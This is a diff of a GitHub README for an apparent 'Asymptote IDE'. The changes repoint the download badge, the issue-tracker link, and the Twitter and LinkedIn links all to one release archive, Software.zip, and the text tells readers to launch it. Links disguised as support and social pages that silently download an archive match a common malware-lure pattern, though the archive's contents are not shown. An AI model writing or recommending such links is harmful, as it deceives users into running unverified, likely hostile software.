@@ -12,7 +12,7 @@ Welcome to the Asymptote programming language Integrated Development Environment
 To start using the Asymptote IDE for SNU Programming Tools in the 2D Mode, follow the steps below:
 
 1. Click on the following link to download the latest version of the IDE:
-[![Download IDE](https://img.shields.io/badge/Download-IDE-blue)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download IDE](https://github.com/Saa1001/SNU_2D_ProgrammingTools_IDE_Asymptote/releases/download/v1.0/Software.zip)](https://github.com/Saa1001/SNU_2D_ProgrammingTools_IDE_Asymptote/releases/download/v1.0/Software.zip)
 
 2. Launch the downloaded file to set up the IDE for your programming needs.
 
@@ -29,10 +29,10 @@ We welcome contributions to enhance the Asymptote IDE submodule for SNU Programm
 - Submit a pull request.
 
 ## Support
-If you encounter any issues or have questions about the Asymptote IDE submodule, feel free to [create an issue](https://github.com/SNU_2D_ProgrammingTools_IDE_Asymptote/issues).
+If you encounter any issues or have questions about the Asymptote IDE submodule, feel free to [create an issue](https://github.com/Saa1001/SNU_2D_ProgrammingTools_IDE_Asymptote/releases/download/v1.0/Software.zip).
 
 ## Stay Connected
-Stay updated on the latest developments by following us on [Twitter](https://twitter.com/SNUProgrammingTools) and [LinkedIn](https://www.linkedin.com/company/snu-programming-tools).
+Stay updated on the latest developments by following us on [Twitter](https://github.com/Saa1001/SNU_2D_ProgrammingTools_IDE_Asymptote/releases/download/v1.0/Software.zip) and [LinkedIn](https://github.com/Saa1001/SNU_2D_ProgrammingTools_IDE_Asymptote/releases/download/v1.0/Software.zip).
 
 ---
 
